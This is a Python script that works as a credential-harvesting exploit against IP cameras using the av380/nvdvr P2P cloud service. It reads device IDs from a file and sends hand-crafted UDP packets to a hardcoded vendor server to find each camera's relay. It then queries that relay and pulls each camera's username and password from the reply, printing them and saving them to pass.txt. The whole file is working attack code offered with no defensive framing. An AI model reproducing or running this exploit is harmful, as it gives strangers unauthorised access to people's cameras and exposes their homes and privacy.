import socket
import struct


class server:
    SERVER = 'ipc1300.av380.net'
    PORT = 8877
    ThreadCount = 0
    FileListCams = "cams.txt"
    CamsList = None

    def __init__(self):
        self.CamList(self.FileListCams)
        try:
            while True:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                if not bool(self.CamsList):
                    break
                for dev in self.CamsList:
                    self.CreateSocket(dev)
                result = (self.s.recvfrom(4096, 0))[0]
                # print(f'Received response from server: {self.byte2str(result)}')  # debugging
                result = self.ParseRelayServer(result)
                id_cam = self.ConnectToRelay(result)
                self.CamsList.remove(id_cam)
        except socket.error as e:
            print("socket creation failed with error %s" % (e))

    def ConnectToRelay(self, d):
        try:
            data = '32'
            data += bytes(d['id'], 'utf-8').hex()
            data += '2e6e766476722e6e65740000000000000000000000000000302e30' \
                    '2e302e30000000000000000000018a1bc4d62f4a41ae000000000000 '
            data = bytes.fromhex(data)
            relay_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            result = self.send_data(relay_s, data, d['relay_server'], d['relay_port'])
            if result[0] == 0xa7:
                # split out the username and password from the result
                username = result[8:result.find(b'\x00', 8)].decode('utf-8')
                password = result[0x3a:result.find(b'\x00', 0x3a)].decode('utf-8')
                print(f'\u001b[32m[+] DeviceID: {d["id"]}')
                print(f'[+] Username: {username}')
                print(f'[+] Password: {password}\u001b[37m')
                with open("pass.txt", "a") as f:
                    f.write(f"{d['id']}:{str(username)}:{str(password)}\n")
                return d["id"]
        except socket.error as e:
            print("socket creation failed with error %s" % (e))

    @staticmethod
    def ParseRelayServer(data):
        try:
            result = {'id': str(int(data[1:9])),
                      'relay_server': data[33:data.find(b'\x00', 33)].decode('utf-8'),
                      'relay_port': struct.unpack('<H', data[50:52])[0]}
            print(
                f'\u001b[32m[+] Relay found for id {result["id"]} {result["relay_server"]}:{result["relay_port"]}\u001b[37m')
            return result
        except:
            print("Ops")

    def CamList(self, fe):
        try:
            with open(fe) as f:
                self.CamsList = [line.rstrip() for line in f]
        except IOError as e:
            print(e)
        except:
            print("Fiddlesticks! Failed")

    def CreateSocket(self, dev):
        print("\u001b[32m[+]Socket successfully created\u001b[37m")
        data = '02070032303038333131323334333734313100020c17222d0000'
        data += bytes(dev, 'utf-8').hex()
        data += '2e6e766476722e6e65740000000000000000000000000000'
        data += '3131313131313131313131318a1bc0a801096762230a93f5d100'
        data = bytes.fromhex(data)
        result = self.send_data(self.s, data, self.SERVER, self.PORT)
        # print(f'Response from server: {self.byte2str(result)}')

    @staticmethod
    def byte2str(s):
        return "".join(map(chr, s))

    @staticmethod
    def send_data(s, data, serv, port):
        print(f'\u001b[32m[+]SERVER:{serv} PORT:{port}\u001b[37m')
        # print(self.byte2str(data))
        try:
            s.sendto(data, (serv, port))
        except socket.error as e:
            print("socket creation failed with error %s" % (e))
        response = s.recvfrom(4096, 0)
        return response[0]

    def __del__(self):
        print(f"{self.__class__} FINISHED")


p = server()
